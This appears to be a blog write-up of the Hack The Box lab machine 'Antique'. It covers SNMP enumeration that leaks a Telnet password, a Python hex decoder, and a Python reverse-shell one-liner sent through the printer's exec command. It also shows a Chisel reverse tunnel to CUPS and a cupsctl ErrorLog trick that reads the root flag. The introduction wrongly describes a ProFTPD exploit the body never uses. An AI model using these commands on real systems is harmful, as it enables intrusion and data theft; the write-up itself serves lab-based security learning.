---
layaout: post
image: /assets/antique/antique.png
title: Antique Write Up HTB
date: 04-02-2025
categories: [Write ups]
tag: [Antique,SNMP,Chisel,Port Forwarding]
excerpt: "Antique on Hack The Box is an easy-difficulty Linux machine that revolves around exploiting a vulnerable ProFTPD server and escalating privileges through misconfigurations in the system. The initial foothold requires leveraging a known vulnerability in ProFTPD to gain remote code execution, granting access to the machine. From there, privilege escalation involves identifying and exploiting weaknesses in system configurations to achieve root access.

This machine is ideal for beginners looking to understand FTP exploitation and basic privilege escalation techniques in a controlled environment."
---
![img-description](/assets/antique/antique.png)

Antique on Hack The Box is an easy-difficulty Linux machine that revolves around exploiting a vulnerable ProFTPD server and escalating privileges through misconfigurations in the system. The initial foothold requires leveraging a known vulnerability in ProFTPD to gain remote code execution, granting access to the machine. From there, privilege escalation involves identifying and exploiting weaknesses in system configurations to achieve root access.

This machine is ideal for beginners looking to understand FTP exploitation and basic privilege escalation techniques in a controlled environment.

# ENUMERATION
---

First, we perform a port scan as usual with the command:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts
```

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.107 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 23:10 CET
Initiating SYN Stealth Scan at 23:10
Scanning 10.10.11.107 [65535 ports]
Discovered open port 23/tcp on 10.10.11.107
Completed SYN Stealth Scan at 23:10, 12.03s elapsed (65535 total ports)
Nmap scan report for 10.10.11.107
Host is up, received user-set (0.044s latency).
Scanned at 2025-01-30 23:10:11 CET for 12s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
23/tcp open  telnet  syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.15 seconds      
Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)

```

---
## TELNET

---

As we can see, port 23 is open, so let's analyze it using the Telnet tool.

```bash
telnet 10.10.11.107
```

When entering the command, it asks for a password that we do not have, so we need to continue investigating.

---
## SNMP

---

To do this, we run the following command to enumerate the public data:

```bash
snmpwalk -v 2c -c public 10.10.11.107
```

```bash
snmpwalk -v 2c -c public 10.10.11.107
iso.3.6.1.2.1 = STRING: "HTB Printer"
```

Once we know it is a printer, we can look at the "iso" part, and thanks to that, we can run the following command:

```bash
snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1
```

```bash
snmpwalk -v 2c -c public 10.10.11.107 .1.3.6.1.4.1
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135 
iso.3.6.1.4.1.11.2.3.9.1.2.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

We get hexadecimal data. To decrypt it, we use a Python script:

```python
import re

# Function to convert hexadecimal to text
def hex_to_text(hex_string):
    # Split the hexadecimal string into blocks of 2 characters
    hex_values = hex_string.split()
    
    # Convert each hexadecimal value to its corresponding character
    decoded_text = ''.join([chr(int(h, 16)) for h in hex_values if 32 <= int(h, 16) <= 126])  # Only printable characters
    
    return decoded_text

# Function that only accepts text input when Enter is pressed
def get_hex_input():
    print("Please enter the hexadecimal data (only text) and press Enter:")
    hex_input = ""
    while True:
        # Take input line by line
        line = input()
        
        # Ensure the line is not empty and contains only valid characters
        if line.strip() == "":
            print("Input cannot be empty. Please try again.")
            continue
        
        # Make sure only valid hexadecimal characters (0-9, A-F) are entered
        if not re.match(r'^[0-9A-Fa-f\s]+$', line):
            print("Please enter only valid hexadecimal characters. Try again.")
            continue
        
        # If the line is valid, add it to the full text
        hex_input += line.strip() + " "
        
        # Ask if more data should be entered
        response = input("Do you want to enter more data? (Y/N): ").strip().lower()
        if response != 'y':
            break
    
    # If a '33' is missing at the end (the number 3 in hexadecimal), we add it automatically
    if not hex_input.endswith("33"):
        hex_input += "33"
    
    return hex_input.strip()

# Get and process the input
hex_input = get_hex_input()

# Check if the input is not empty
if hex_input:
    # Convert and display the result
    decoded_result = hex_to_text(hex_input)
    print(f"Decoded text: {decoded_result}")
else:
    print("No hexadecimal data was entered.")
```

We run it:

```bash
python3 py.py
Please enter the hexadecimal data (only text) and press Enter:
50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32 
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135Do you want to enter more data? (Y/N): 
Decoded text: P@ssw0rd@123!!123
```

Now that we have the password, we can try to log in again on port 23 with the same command:

```bash
telnet 10.10.11.107
```

```bash
telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password: P@ssw0rd@123!!123

Please type "?" for HELP
> dir
Err updating configuration
> ?

To Change/Configure Parameters Enter:
Parameter-name: value <Carriage Return>

Parameter-name Type of value
ip: IP-address in dotted notation
subnet-mask: address in dotted notation (enter 0 for default)
default-gw: address in dotted notation (enter 0 for default)
syslog-svr: address in dotted notation (enter 0 for default)
idle-timeout: seconds in integers
set-cmnty-name: alpha-numeric string (32 chars max)
host-name: alpha-numeric string (upper case only, 32 chars max)
dhcp-config: 0 to disable, 1 to enable
allow: <ip> [mask] (0 to clear, list to display, 10 max)

addrawport: <TCP port num> (<TCP port num> 3000-9000)
deleterawport: <TCP port num>
listrawport: (No parameter required)

```

To see the command help, we enter ? in the shell and see that there is an exec command, which allows us to execute a reverse shell to our IP. Before doing that, we listen on any port with Netcat like this:

```bash
❯ nc -lvnp 1234
```

Once we are listening, we can execute:

```bash
 exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR IP",YOUR PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
```

When we execute it and look at the Netcat, we can see that it successfully connects. If not, try running the above command multiple times.

```bash
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.10.9] from (UNKNOWN) [10.10.11.107] 58136
lp@antique:~$ ls
ls
telnet.py  user.txt
lp@antique:~$ cat user.txt
2849dbk##################
```

---
## PRIVILEGE ESCALATION

---

Once inside, we run the following command:

```bash
netstat -ant
```

```bash
lp@antique:~$ netstat -ant
netstat -ant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     
tcp        0      0 10.10.11.107:23         10.10.14.12:51668       ESTABLISHED
tcp        0    150 10.10.11.107:58136      10.10.14.12:1234        ESTABLISHED
tcp6       0      0 ::1:631                 :::*                    LISTEN 
```

We notice a strange port 631 running, so we investigate further. To do that, we download Chisel on our machine Chisel Release.

After downloading and unpacking, we run the following commands:

```bash
cd chisel && go build -ldflags="-s -w"
sudo ./chisel server -p 8000 --reverse
```

Once installed, we move it to the "Antique" machine and run a Python server:

```bash
python3 -m http.server 8001
```

```bash
❯ python3 -m http.server 8001

Serving HTTP on 0.0.0.0 port 8001 (http://0.0.0.0:8001/) ...

```

CHECK THAT THE PYTHON SERVER IS STARTED WHERE CHISEL IS LOCATED AND PERFORM THE WGET ON THE ANTIQUE MACHINE TO /TMP. Now, we run the following command on the Antique machine:

```bash
wget 10.10.10.9:8001/chisel_1.10.1_linux_amd64
```

```bash
lp@antique:~$ wget 10.10.10.9:8001/chisel_1.10.1_linux_amd64
wget 10.10.14.12:8001/chisel_1.10.1_linux_amd64
--2025-01-30 22:57:46--  http://10.10.10.9:8001/chisel_1.10.1_linux_amd64
Connecting to 10.10.14.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13233243 (13M) [application/octet-stream]
Saving to: ‘chisel’

chisel              100%[===================>]  12.62M  8.05MB/s    in 1.6s    

2025-01-30 22:57:48 (8.05 MB/s) - ‘chisel_1.10.1_linux_amd64’ saved [13233243/13233243]
```

Next, we give it the necessary execution permissions:

```bash
chmod +x chisel_1.10.1_linux_amd64
```

```bash
lp@antique:/tmp$ chmod +x chisel_1.10.1_linux_amd64
chmod +x chisel_1.10.1_linux_amd64
```

```bash
lp@antique:/tmp$ ./chisel_1.10.1_linux_amd64 client 10.10.10.9:8000 R:9631:localhost:631
2025/01/31 16:06:04 client: Connecting to ws://10.10.14.12:8000
2025/01/31 16:06:04 client: Connected (Latency 46.104106ms)
```

After running the previous command, we will see this on our Chisel server:

```bash
chisel server --reverse -p 8000
2025/01/31 17:03:53 server: Reverse tunnelling enabled
2025/01/31 17:03:53 server: Fingerprint MupEXm/o7MuUD1Lq4Z+jLkAawJT9BN0GM56n1ohIkl4=
2025/01/31 17:03:53 server: Listening on http://0.0.0.0:8000
2025/01/31 17:06:04 server: session#1: tun: proxy#R:9631=>localhost:631: Listening
```

This means we did it correctly. Now, on our machine, we can go to our localhost on port 631, and we will see this:

After spending some time investigating, we go to Administration and find some interesting things:

We can see an Error Log section that shows it's running as localhost, which can be modified on the victim machine. Therefore, we run the following command:

```bash
cupsctl ErrorLog="/root/root.txt"
```

```bash
lp@antique:/tmp$ cupsctl ErrorLog="/root/root.txt"
```

Now, when we perform a curl on the error log URL, we get the root flag:

```bash
curl http://localhost:631/admin/log/error_log?
```

```bash
lp@antique:/tmp$ curl http://localhost:631/admin/log/error_log?
56a7575cae9c41a9############
```

Finally we can get the root flag!

